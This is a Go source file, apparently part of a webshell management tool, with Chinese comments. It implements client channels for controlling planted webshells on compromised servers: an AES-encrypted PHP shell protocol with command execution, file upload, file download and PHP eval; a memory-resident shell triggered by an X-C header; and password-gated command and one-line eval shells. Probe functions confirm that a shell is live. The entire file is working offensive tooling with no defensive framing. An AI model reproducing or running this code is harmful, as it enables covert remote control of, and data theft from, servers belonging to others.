// 通道 codec:dsh-aes(自研加密马) / dsh-mem(内存马 X-C 头) / cmd-eval / cmd-system。
package webshellproto

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
)

// =====================================================================
// AES 基元(CBC 走 stdlib;ECB 手写块循环)
// =====================================================================

func aesCBCEncrypt(key, iv, plaintext []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	pad := block.BlockSize() - len(plaintext)%block.BlockSize()
	padded := append(append([]byte{}, plaintext...), bytes.Repeat([]byte{byte(pad)}, pad)...)
	out := make([]byte, len(padded))
	cipher.NewCBCEncrypter(block, iv).CryptBlocks(out, padded)
	return out, nil
}

func aesCBCDecrypt(key, iv, ciphertext []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	if len(ciphertext) == 0 || len(ciphertext)%block.BlockSize() != 0 {
		return nil, fmt.Errorf("密文长度非法")
	}
	out := make([]byte, len(ciphertext))
	cipher.NewCBCDecrypter(block, iv).CryptBlocks(out, ciphertext)
	return pkcs7Unpad(out)
}

func aesECBEncrypt(key, plaintext []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	bs := block.BlockSize()
	pad := bs - len(plaintext)%bs
	padded := append(append([]byte{}, plaintext...), bytes.Repeat([]byte{byte(pad)}, pad)...)
	out := make([]byte, len(padded))
	for i := 0; i < len(padded); i += bs {
		block.Encrypt(out[i:i+bs], padded[i:i+bs])
	}
	return out, nil
}

func aesECBDecrypt(key, ciphertext []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	bs := block.BlockSize()
	if len(ciphertext) == 0 || len(ciphertext)%bs != 0 {
		return nil, fmt.Errorf("密文长度非法")
	}
	out := make([]byte, len(ciphertext))
	for i := 0; i < len(ciphertext); i += bs {
		block.Decrypt(out[i:i+bs], ciphertext[i:i+bs])
	}
	return pkcs7Unpad(out)
}

func pkcs7Unpad(b []byte) ([]byte, error) {
	if len(b) == 0 {
		return nil, fmt.Errorf("空密文")
	}
	pad := int(b[len(b)-1])
	if pad == 0 || pad > len(b) {
		return nil, fmt.Errorf("填充非法")
	}
	for _, c := range b[len(b)-pad:] {
		if int(c) != pad {
			return nil, fmt.Errorf("填充非法")
		}
	}
	return b[:len(b)-pad], nil
}

// =====================================================================
// dsh-aes:自研加密马通道
//   请求:POST 本马;Header X-T = base64( IV(16B) || KEY(16B) );Body = base64( AES-128-CBC )
//   明文载荷 = 操作码(1B) + 参数:c<命令> / u|<路径>|<b64> / d|<路径> / e<php>(v2)
//   响应:业务 JSON {"code":0,"data":"<base64(结果)>"};失败静默 404/500。
// =====================================================================

// DshAesSendOp 发送一次操作,返回结果字节。
func DshAesSendOp(conn *Conn, op string) ([]byte, error) {
	key := make([]byte, 16)
	iv := make([]byte, 16)
	if _, err := rand.Read(key); err != nil {
		return nil, err
	}
	if _, err := rand.Read(iv); err != nil {
		return nil, err
	}
	ct, err := aesCBCEncrypt(key, iv, []byte(op))
	if err != nil {
		return nil, err
	}
	ivKey := append(append([]byte{}, iv...), key...)
	headers := map[string]string{"X-T": B64(ivKey), "Content-Type": "application/octet-stream"}
	for k, v := range conn.Headers {
		headers[k] = v
	}
	res, err := HTTPDo("POST", conn.URL, headers, []byte(B64(ct)), conn.timeout())
	if err != nil {
		return nil, err
	}
	if res.Status != 200 {
		return nil, fmt.Errorf("马侧静默拒绝(HTTP %d——密钥/协议不符或马不存在)", res.Status)
	}
	var jsonResp struct {
		Code int    `json:"code"`
		Msg  string `json:"msg"`
		Data string `json:"data"`
	}
	if err := json.Unmarshal(res.Body, &jsonResp); err != nil {
		return nil, fmt.Errorf("响应非业务 JSON——协议不匹配")
	}
	if jsonResp.Code != 0 {
		return nil, fmt.Errorf("马侧返回失败:%s", jsonResp.Msg)
	}
	return Unb64(jsonResp.Data)
}

// DshAesCmd 命令执行(c 操作码)。
func DshAesCmd(conn *Conn, command string) (string, error) {
	buf, err := DshAesSendOp(conn, "c"+command)
	return string(buf), err
}

// DshAesWriteFile 上传写文件(u 操作码,二进制安全)。
func DshAesWriteFile(conn *Conn, path string, data []byte) error {
	_, err := DshAesSendOp(conn, "u|"+path+"|"+B64(data))
	return err
}

// DshAesReadFile 下载读文件(d 操作码,二进制安全)。
func DshAesReadFile(conn *Conn, path string) ([]byte, error) {
	return DshAesSendOp(conn, "d"+path)
}

// DshAesEval 执行 PHP 代码(e 操作码,仅 v2 马)。
func DshAesEval(conn *Conn, code string) (string, error) {
	buf, err := DshAesSendOp(conn, "e"+code)
	return string(buf), err
}

// DshAesProbe 探测:c 操作码回显 token。
func DshAesProbe(conn *Conn) bool {
	token := ProbeToken("WSMP")
	probe := &Conn{}
	*probe = *conn
	probe.TimeoutMs = minInt(conn.TimeoutMs, 8000)
	out, err := DshAesCmd(probe, "echo "+token)
	return err == nil && strings.Contains(out, token)
}

// DshAesProbeEval v2 能力探测:e 操作码执行 PHP 回显。
func DshAesProbeEval(conn *Conn) bool {
	token := ProbeToken("WSMP")
	probe := &Conn{}
	*probe = *conn
	probe.TimeoutMs = minInt(conn.TimeoutMs, 8000)
	out, err := DshAesEval(probe, `echo "`+token+`";`)
	return err == nil && strings.Contains(out, token)
}

func minInt(a, b int) int {
	if a == 0 {
		return b
	}
	if b == 0 || a < b {
		return a
	}
	return b
}

// =====================================================================
// dsh-mem:内存马通道(X-C 头触发)
//   触发:任意存活路径 + 请求头 X-C=<命令>(GET)
//   回显:base64(stdout)[|base64(stderr)];stderr 段部分形态为原文
// =====================================================================

func decodeMemSeg(seg string) string {
	s := strings.TrimSpace(seg)
	if s == "" {
		return ""
	}
	// 纯 b64 字母表 → 解码;否则原文(Module 型 stderr 段为原文)
	for _, c := range s {
		if !(c == '+' || c == '/' || c == '=' || c == '\r' || c == '\n' ||
			(c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9')) {
			return s
		}
	}
	if buf, err := base64.StdEncoding.DecodeString(s); err == nil {
		return string(buf)
	}
	return s
}

// DshMemRun 执行命令 → stdout(+stderr 追加)。X-C 头仅限 latin-1。
func DshMemRun(conn *Conn, command string) (string, error) {
	for _, r := range command {
		if r > 0xFF {
			return "", fmt.Errorf("X-C 头通道仅支持 latin-1 命令字符——中文等非 ASCII 字面量请改英文命令")
		}
	}
	headers := map[string]string{"X-C": command}
	for k, v := range conn.Headers {
		headers[k] = v
	}
	res, err := HTTPDo("GET", conn.URL, headers, nil, conn.timeout())
	if err != nil {
		return "", err
	}
	if res.Status != 200 {
		return "", fmt.Errorf("内存马拒绝(HTTP %d——未注入或触发头不符)", res.Status)
	}
	text := strings.TrimSpace(string(res.Body))
	if text == "" {
		return "", fmt.Errorf("内存马无回显——未注入或触发头不符")
	}
	if bar := strings.Index(text, "|"); bar >= 0 {
		return decodeMemSeg(text[:bar]) + decodeMemSeg(text[bar+1:]), nil
	}
	return decodeMemSeg(text), nil
}

// DshMemProbe 探测。
func DshMemProbe(conn *Conn) bool {
	token := ProbeToken("WSMM")
	probe := &Conn{}
	*probe = *conn
	probe.TimeoutMs = minInt(conn.TimeoutMs, 8000)
	out, err := DshMemRun(probe, "echo "+token)
	return err == nil && strings.Contains(out, token)
}

// =====================================================================
// cmd 双通道
//   cmd-system:口令门 + 命令参数马(pass=<password>&<cmd>=<command>)
//   cmd-eval:一句话 eval 马(pass 参数携带 PHP 代码)
// =====================================================================

func formBody(pairs [][2]string) string {
	var parts []string
	for _, kv := range pairs {
		if kv[1] == "" {
			continue
		}
		parts = append(parts, urlEncode(kv[0])+"="+urlEncode(kv[1]))
	}
	return strings.Join(parts, "&")
}

func urlEncode(s string) string {
	var b strings.Builder
	for _, c := range []byte(s) {
		if (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') ||
			c == '-' || c == '_' || c == '.' || c == '~' {
			b.WriteByte(c)
		} else {
			fmt.Fprintf(&b, "%%%02X", c)
		}
	}
	return b.String()
}

func mergeConnHeaders(conn *Conn, extra map[string]string) map[string]string {
	headers := map[string]string{}
	for k, v := range conn.Headers {
		headers[k] = v
	}
	for k, v := range extra {
		headers[k] = v
	}
	if cookie := CookieHeaderFor(conn.scopeKey()); cookie != "" {
		headers["Cookie"] = cookie
	}
	return headers
}

// cmdSendForm 表单/原文发送一次。
func cmdSendForm(conn *Conn, params [][2]string) (int, string, error) {
	isGet := conn.Method == "get"
	targetURL := conn.URL
	method := "POST"
	var body []byte
	headersExtra := map[string]string{"Content-Type": "application/x-www-form-urlencoded"}
	if isGet {
		q := formBody(params)
		sep := "?"
		if strings.Contains(targetURL, "?") {
			sep = "&"
		}
		targetURL += sep + q
		method = "GET"
		body = nil
		headersExtra = map[string]string{}
	} else {
		body = []byte(formBody(params))
	}
	res, err := HTTPDo(method, targetURL, mergeConnHeaders(conn, headersExtra), body, conn.timeout())
	if err != nil {
		return 0, "", err
	}
	AbsorbCookies(conn.scopeKey(), res.Headers)
	return res.Status, DecodeBody(res.Body, conn.Encoding, res.Headers.Get("Content-Type")), nil
}

// CmdSystemExec cmd-system:执行 OS 命令。
func CmdSystemExec(conn *Conn, command string) (string, error) {
	params := [][2]string{}
	if conn.Password != "" {
		params = append(params, [2]string{orDefault(conn.PassParam, "pass"), conn.Password})
	}
	params = append(params, [2]string{orDefault(conn.CmdParam, "cmd"), command})
	status, output, err := cmdSendForm(conn, params)
	if err != nil {
		return "", err
	}
	if status == 0 || status >= 500 {
		return "", fmt.Errorf("目标响应异常(HTTP %d)", status)
	}
	return output, nil
}

// CmdPhpEval cmd-eval:执行 PHP 代码并返回输出。
func CmdPhpEval(conn *Conn, code string) (string, error) {
	status, output, err := cmdSendForm(conn, [][2]string{{orDefault(conn.PassParam, "pass"), code}})
	if err != nil {
		return "", err
	}
	if status == 0 {
		return "", fmt.Errorf("目标不可达(HTTP %d)", status)
	}
	return output, nil
}

// CmdSystemProbe / CmdEvalProbe 探测。
func CmdSystemProbe(conn *Conn) bool {
	token := ProbeToken("WSMP")
	probe := &Conn{}
	*probe = *conn
	probe.TimeoutMs = minInt(conn.TimeoutMs, 8000)
	out, err := CmdSystemExec(probe, "echo "+token)
	return err == nil && strings.Contains(out, token)
}

func CmdEvalProbe(conn *Conn) bool {
	token := ProbeToken("WSMP")
	probe := &Conn{}
	*probe = *conn
	probe.TimeoutMs = minInt(conn.TimeoutMs, 8000)
	out, err := CmdPhpEval(probe, `echo "`+token+`";`)
	return err == nil && strings.Contains(out, token)
}

func orDefault(s, def string) string {
	if strings.TrimSpace(s) == "" {
		return def
	}
	return s
}
